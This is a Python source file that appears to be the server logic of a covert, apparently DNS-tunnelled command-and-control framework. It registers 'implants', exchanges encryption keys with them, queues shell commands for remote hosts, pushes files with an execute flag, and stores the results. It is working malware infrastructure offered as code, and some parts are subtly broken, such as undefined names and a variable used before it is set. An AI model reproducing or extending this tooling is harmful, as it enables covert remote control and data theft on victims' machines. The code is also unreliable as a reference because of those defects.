import base64
import binascii
import sqlite
import datetime
import random
import string
import os
import math
import hashlib
import logging
from Cryptodome.Cipher import AES,PKCS1_OAEP
from Cryptodome.Random import get_random_bytes
from Cryptodome import Random
from Cryptodome.PublicKey import RSA
from Cryptodome.Util import number
from Cryptodome.Util.Padding import pad,unpad

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class const:
	xml_modulus_begin='<Modulus>'
	xml_modulus_end='</Modulus>'
	xml_exponent_begin='<Exponent>'
	xml_exponent_end='</Exponent>'
	aes_block_size=128
	max_data_in_response=207
	encrypted_chunks_size=40

class logic:
	_REGISTRATION=0
	REGISTER_PACKET=None
	db=None
	domain=""
	def __init__(self,store,log_path,log_level):
		logging_level=logging.INFO 
		if (log_level=="WARNING"):
			logging_level=logging.WARNING
		elif (log_level=="ERROR"):
			logging_level=logging.ERROR
		elif (log_level=="CRITICAL"):
			logging_level=logging.CRITICAL
		elif (log_level=="DEBUG"):
			logging_level=logging.DEBUG
			 
		logging.basicConfig(filename=log_path, filemode='a', format='%(asctime)s - %(levelname)s - %(message)s',level=logging_level)
		self.db=sqlite.db(store)
		logging.info("Server Started")

	def read(self,content, isEnc):
		logging.debug("Message received: %s",content)
		self.domains=self.domains_list()
		for domain in self.domains:
			if (str(content).find(domain)>-1):
				content=str(content.replace(domain,''))
				break
		#content=str(content.replace(self.domain,''))#get all domains, sort them from longest and check matches.
		try:							#GET FIELDS
			decoded_content=base64.b64decode(content)
			logging.debug("Decoded message: %s",decoded_content.decode())
			all_good=False
			host_id,cmd_id,res=decoded_content.decode().split(';',2)
			host_id=host_id.split(':')[1]
			cmd_id=cmd_id.split(':')[1]
			if (isEnc!=0 and cmd_id!=""): 
				cmd_id=self.decrypt_symmetric(cmd_id,host_id)
			res=res.split(':')[1]
			if (isEnc!=0 and res!=""):
				res=self.decrypt_symmetric(res,host_id)
			all_good=True
		except Exception as e:
			logging.warning("Unrecognised message received (%s): %s",str(e),decoded_content)
			logging.warning("This may be due to an implant using a wrong server public key")
			return None
		finally:
			if all_good:		
				if cmd_id.lower()=="k":			#KEYEXCHANGE
					logging.debug("Key exchange request received")
					new_id=self.ID_from_keys(res)
					logging.debug("New ID for host: %s",str(new_id))
					if (new_id is not None):
						encrypted_command=self.encrypt_symmetric("o",new_id)
						encrypted_result=self.encrypt_symmetric("k",new_id)
						response="H:"+str(new_id)+";C:"+encrypted_command+";R:"+encrypted_result+";"
						response=base64.b64encode(response.encode('utf-8'))
						logging.debug("Key exchange succeded for ID %s",str(new_id))
						return response		
					else:
						logging.error("Key exchange failed")
				if cmd_id.lower()=="c":			#REGISTRATION
					host_details=res.split('|')
					logging.info("Host Registration: %s %s",str(host_id),str(host_details))
					confirm_id=self.register_host(host_id,host_details[0],host_details[1])	
					self.update_host_timestamp(confirm_id)
					if (str(host_id)!=str(confirm_id)):
						logging.info("ID reverted from %s to %s",str(host_id),str(confirm_id))
					response="H:"+str(confirm_id)+";C:;R:;"			
					response=base64.b64encode(response.encode('utf-8'))
					logging.debug("New host registered: %s",str(res))
					return response	
				if cmd_id.lower()=="e":			#DECRYPTIONERROR
					logging.error("Unable to decrypt message. Asking Host to Re-Register")
					response="H:-1;C:c;R:;"
					response=base64.b64encode(response.encode('utf-8'))	
					return response	
				if cmd_id.lower()=="f":			#CONFIRMINGAFILE
					check_host_id=self.get_host_by_file_id(res) 
					if (check_host_id==int(host_id)):
						self.update_host_timestamp(host_id)
						logging.info(str(self.get_host(host_id))+ " is ready to receive file. File upload starting..")
						self.pending_file_to_sending(res)
						response=self.get_formatted_chunk(res,0,host_id)
						response=base64.b64encode(response.encode('utf-8'))
						return response	
				if cmd_id.lower()=="fc":
					self.is_active(confirm_id)
					file_id=res.split('|')[0]
					chunkn=res.split('|')[1]					
					n=int(chunkn)			
					response=self.get_formatted_chunk(file_id,int(chunkn),host_id)					
					response=base64.b64encode(response.encode('utf-8'))
					self.update_host_timestamp(host_id)
					return response	
				if cmd_id.lower()=="ok":
					self.sending_file_to_received(res)
					filename=self.db.get_file_local_path(res)
					logging.info(str(self.get_host(host_id))+ " has received the file")	
					self.update_host_timestamp(host_id)
				if cmd_id.lower()=="fte":
					logging.error("File sending error")
					self.db.update_sending_file_to_pending(res);
					self.update_host_timestamp(host_id)
				if cmd_id.lower()=="fse":
					logging.error("File saving error")
					self.db.update_sending_file_to_save_error(res);
					self.update_host_timestamp(host_id)
				if cmd_id.lower()=="fn":
					filename=self.db.get_file_remote_path(res)
					response="H:"+(host_id)+";C:"+self.encrypt_symmetric("fn",host_id)+";R:"+self.encrypt_symmetric(filename,host_id)+";"
					response=base64.b64encode(response.encode('utf-8'))
					self.update_host_timestamp(host_id)
					return response
				if cmd_id.lower()=="p":		
					#POLLING
					logging.debug("Polling from host %s",str(host_id))					
					if self.id_exists(host_id):	
						self.update_host_timestamp(host_id)
						command=self.get_next_command_to_execute(host_id)
						filesending=self.get_next_file(host_id)
						logging.debug("Command for host: %s",str(command))
						logging.debug("File Sending for host: %s ",str(filesending))					
						if (command==None and filesending==None):								
							#return None							
							response="H:"+(host_id)+";C:"+self.encrypt_symmetric("n",host_id)+";R:;"		#Command=n as "nothing" (for you to do)	
						elif (filesending==None):	
							response=self.execute_command(host_id,command)					
						elif (command==None):
							response=self.send_receive_file(host_id,filesending)
						else:
							if (command[2]<filesending[2]):
								response=self.execute_command(host_id,command)			
							else: 
								response=self.send_receive_file(host_id,filesending)
					response=base64.b64encode(response.encode('utf-8'))						
					return response
					
				if cmd_id[0].lower()=="r":			#COMMAND OUTPUT
					try:						
						result=base64.b64decode(res)
						logging.debug("Command Output Received from: %s", (self.get_host(host_id)))
						logging.debug(result.decode())
						try:
							self.save_results(host_id,cmd_id.split('=')[1],result.decode())
						except Exception as e:
							logging.critical("Cannot store the result into the DB: ",str(e))

					except Exception:
						logging.error("Cannot decode the following string: %s",str(res))
					
				return None

	
	def execute_command(self,host_id,command):
		response="H:"+(host_id)+";C:"+self.encrypt_symmetric(command[1],host_id)+";R:;"
		self.update_sent_next_command(command[0])
		return response
	def send_receive_file(self,host_id,filesending):
		try:
			logging.debug("Sending a file")
			response=""
			file_id=filesending[0]
			original_file_name=filesending[1]
			local_path=self.db.get_file_local_path(file_id)
			remote_path=filesending[4]
			if (remote_path=="AUTO"):
				remote_path=original_file_name
			if (len(remote_path)>19):
				remote_path="NEXT"
			turbo=filesending[5]
			insecure=filesending[6]
			direction=filesending[7]
			execute=filesending[8]
			if direction==0: #send file
				if self.file_exists(local_path):
					logging.debug("File to send found")				
					chunks=self.get_file_chunks(local_path,insecure)
					file_hash=self.get_file_hash(local_path)
					if (chunks!=0 and file_hash!=0):					
						result=str(file_id)+"|"+str(chunks)+"|"+file_hash+"|"+remote_path+"|"+str(turbo)+"|"+str(insecure)+"|"+str(execute)
						logging.debug(result)
						response="H:"+(host_id)+";C:"+self.encrypt_symmetric("f",host_id)+";R:"+self.encrypt_symmetric(result,host_id)+";"
			logging.debug("send_receive_file response: %s",str(response))
			return response
		except Exception as e:
			logging.error("send_receive_file error: %s",str(e))	
	def get_registered_hosts(self):
		return self.db.get_registered_hosts()	
	def get_host_by_file_id(self,file_id):
		return self.db.get_host_by_file_id(file_id)[0]

	def update_host_timestamp(self,host_id):
		timestamp=datetime.datetime.now().strftime("%H:%M:%ST%d-%m-%Y")
		return self.db.update_host_timestamp(host_id,timestamp)	
	

	def id_exists(self,host_id):		
		if int(self.db.id_exists(host_id))>0:
			return True			
		return False

	def ID_from_keys(self, res):
		try:
			client_key=self.decrypt_asymmetric(res.strip())
			host_id=None
			if (client_key!="e"):
				host_id_tuple=self.db.get_key_ID(client_key)
				if host_id_tuple==None:			
					self.db.save_host_by_key(client_key)
					host_id=self.db.get_key_ID(client_key)[0]
					self.update_host_timestamp(host_id)		
				else:
					host_id=host_id_tuple[0]
				return host_id
			else:
				return None
		except Exception as e:
			logging.error("ID_from_keys error: %s",str(e))

	def get_pubkey(self,host_id):	
		key=self.db.get_asymmetric_key(host_id)[0]
		return key
	def pending_file_to_sending(self,file_id):
		return self.db.update_pending_file_to_sending(file_id)
	def sending_file_to_received(self,file_id):
		return self.db.update_sending_file_to_received(file_id)

	def generate_key(self,host_id):
		key=self.db.get_symmetric_key(host_id)[0]
		if key is None:
			key=base64.b64encode(self.randomString(16).encode('utf-8'))
			self.db.save_symmetric_key(key,host_id)
			key=self.db.get_symmetric_key(host_id)[0]
		return key
		
	def register_host(self, host_id,hostname,mac):
		hostID=self.db.save_host(host_id,hostname,mac)
		self.update_host_timestamp(hostID)
		return hostID
		
	def get_host(self,host_id):
		if self.id_exists(host_id):
			hostname=self.db.get_hostname(host_id)
			return hostname[0]
		return 1

	def add_command(self,host_id,next_command):
		if len(next_command)<=const.max_data_in_response:
			if self.id_exists(host_id):				
				timestamp=datetime.datetime.now().strftime("%H:%M:%ST%d-%m-%Y")
				state="PENDING"
				self.db.save_next_command(host_id,next_command,timestamp,state)
				logging.debug("New command added successfully")
			else:
				logging.debug("Cannot add command: no such host ID")
		else:
			logging.debug("Cannot add command: length is > 207 char")

	def send_file(self,host_id,local_file,remote_file,turbo,insecure):
		file_path=local_file
		if self.id_exists(host_id):
			if self.file_exists(file_path):
				if (remote_file is None): remote_file=os.path.basename(file_path)					
				timestamp=datetime.datetime.now().strftime("%H:%M:%ST%d-%m-%Y")
				state="PENDING"
				if (insecure==0):
					file_path=encrypt_file(local_file)
				file_id=self.db.save_sending_file(host_id,local_file,remote_file,turbo,insecure,timestamp,state)				
				logging.debug("File queued")
			else:
				logging.debug("Cannot read the local file")		
		else:
			logging.debug("Cannot add file: no such host ID")
	def del_command(self,host_id,command_id):
		if self.get_next_command_count(host_id,command_id)>0:				
			self.db.del_next_command(command_id)

	def update_command(self,host_id,cmd_id,res):
		cmd=cmd_id.split('=')[1]
		pending_id=self.db.get_pending_command(host_id,cmd_id)

	def save_results(self,host_id,cmd,result):
		timestamp=datetime.datetime.now().strftime("%H:%M:%ST%d-%m-%Y")
		return self.db.save_command_result(host_id,cmd,result,timestamp)
	
	def get_next_commands(self,host_id):
		return self.db.get_next_commands(host_id)
	def get_next_command(self,host_id,command_id):
		return self.db.get_next_command(host_id,command_id)

	def get_next_command_count(self,host_id,command_id):
		return self.db.get_next_command_count(host_id,command_id)[0]

	def get_next_command_to_execute(self,host_id):
		return self.db.get_next_pending_command(host_id)
	def get_next_file(self,host_id):
		return self.db.get_next_pending_file(host_id)

	def update_sent_next_command(self,command_id):
		return self.db.update_sent_next_command(command_id)

	def randomString(self,length):
		return ''.join([random.choice(string.ascii_lowercase+string.ascii_uppercase+string.digits) for n in range(length)])
	def encrypt_symmetric(self,content,host_id):
		try:
			logging.debug("Symmetric encryption of: %s",str(content))
			key=self.db.get_symmetric_key(host_id)			
			sym_key=key[0].decode()
			iv=get_random_bytes(AES.block_size)
			aes = AES.new(base64.b64decode(sym_key), AES.MODE_CBC,iv)
			encrypted=base64.b64encode(aes.encrypt(pad(content.encode('utf-8'),AES.block_size)))+'%'.encode('utf-8')+base64.b64encode(iv)
		except Exception as e:
			logging.error("Symmetric encryption error: %s",str(e))
			return "e"
		return encrypted.decode()
	def encrypt_chunk(self,content,host_id):
		try:
			key=self.db.get_symmetric_key(host_id)			
			sym_key=key[0].decode()
			iv=get_random_bytes(AES.block_size)
			aes = AES.new(base64.b64decode(sym_key), AES.MODE_CBC,iv)
			encrypted=base64.b64encode(aes.encrypt(pad(content,AES.block_size)))+'%'.encode('utf-8')+base64.b64encode(iv)
		except Exception as e:
			logging.error("chunk encryption error: %s",str(e))
			return "e"
		return encrypted.decode()
	def decrypt_symmetric(self,content,host_id):
		try:
			logging.debug("Decrypting content for host %s",str(host_id))
			key=self.db.get_symmetric_key(host_id)
			if key is not None:
				sym_key=key[0]
				message_and_iv=content.split('%')
				aes = AES.new(base64.b64decode(sym_key), AES.MODE_CBC,base64.b64decode(message_and_iv[1]))
				decrypted=unpad(aes.decrypt(base64.b64decode(message_and_iv[0])),AES.block_size)
				return decrypted.decode()
			else:
				return "e"
		except Exception as e:
			logging.error("Error while decrypting : %s",str(e))
			logging.error("with key: %s",str(key))
			logging.error("with session key: %s",str(sym_key))
			logging.error("with content: %s",str(content))
			return "e"

	def encrypt_asymmetric(self,content,host_id):
		
		decoded_key=self.get_pubkey(host_id)
		start_modulus=decoded_key.find(const.xml_modulus_begin)+len(const.xml_modulus_begin)
		end_modulus=decoded_key.find(const.xml_modulus_end,start_modulus)
		modulus=decoded_key[start_modulus:end_modulus]
		start_exponent=decoded_key.find(const.xml_exponent_begin)+len(const.xml_exponent_begin)
		end_exponent=decoded_key.find(const.xml_exponent_end,start_exponent)
		exponent=decoded_key[start_exponent:end_exponent]
		e = number.bytes_to_long(base64.b64decode(exponent))
		m = number.bytes_to_long(base64.b64decode(modulus))
		key=RSA.construct((m,e))
		client_cipher=PKCS1_OAEP.new(key)
		server_cipher=PKCS1_OAEP.new(self.RSAkey)
		encrypted=base64.b64encode(server_cipher.encrypt(client_cipher.encrypt(content))).decode()
		return encrypted

	def decrypt_asymmetric(self,content):
		logging.debug("Decrypt asymmetric")
		key_list=self.server_keys()
		decrypted=None
		for key in key_list:
			if (decrypted is None):
				try:
					logging.debug("Trying decrypting with key %s and content %s",str(key),str(content))
					cipher=PKCS1_OAEP.new(key)
					decrypted=cipher.decrypt(base64.b64decode(content))
				except Exception as e:
					decrypted=None
					logging.error("Error while decrypting : %s",str(e))
			else:
				break
		return base64.b64encode(decrypted)

	def pack_bigint(self,i):
		b=bytearray()
		while i:
			b.append(i & 0xFF)
			i>>=8
		return b
	def file_exists(self,path):
		try:
			if (os.path.isfile(path) and os.access(path,os.R_OK)):
				return True
		except:
			return False
		return False
	def get_file_chunks(self,path,insecure):
		try:
			size=os.stat(path).st_size
			if (insecure==0): chunks=size/const.max_data_in_response
			else: chunks=size/const.encrypted_chunks_size	
			rounded=math.ceil(chunks)			
			return rounded
		except:			
			return 0
	def get_file_hash(self,path):
		try:
			h=hashlib.md5()
			with open(path,'rb') as file:
				chunk=0
				while chunk!=b'':
					chunk=file.read(1024)
					h.update(chunk)			
			return h.hexdigest()
		except:
			return 0
	def get_formatted_chunk(self,file_id,chunk_number,host_id):
		try:
			chunk=self.get_chunk(file_id,chunk_number)
			encrypted_command=self.encrypt_symmetric("fc",host_id)
			insecure=self.db.get_file_insecure(file_id)
			if (chunk is not None):
				if (insecure=="F"):
					chunk=self.encrypt_chunk(chunk,host_id)
				else: chunk=base64.b64encode(chunk)			
				response="H:"+host_id+";C:"+encrypted_command+";R:"+chunk.decode('utf-8')+";"
				return response
		except Exception as e:
			debug.error("Function get_formatted_chunk error: ",str(e))

	def get_chunk(self,file_id,chunk_number):
		filename=self.db.get_file_local_path(file_id)
		insecure=self.db.get_file_insecure(file_id)
		if (insecure=="F"): size=const.max_data_in_response
		else: size=const.encrypted_chunks_size
		position=chunk_number*size
		chunk=None
		if self.file_exists(filename):
			totchunks=self.get_file_chunks(filename,insecure)
			with open(filename,"rb") as binary_file:
				binary_file.seek(position)
				if (totchunks==chunk_number): chunk=binary_file.read()
				else: chunk=binary_file.read(size)
				binary_file.close()
				return chunk#.decode('utf-8')

	def domains_list(self):
		list_from_db=self.db.get_domains()
		domain_list=[]
		for x in range (0,len(list_from_db)):
			domain_list.append(list_from_db[x][0].replace('.',''))
		sorted_list=sorted(domain_list,key=len,reverse=True)
		return sorted_list
		
	def server_keys(self):
		list_from_db=self.db.get_servers_key()
		key_list=[]
		for x in range(0,len(list_from_db)):
			key_list.append(RSA.importKey(list_from_db[x][0]))
		return key_list

		
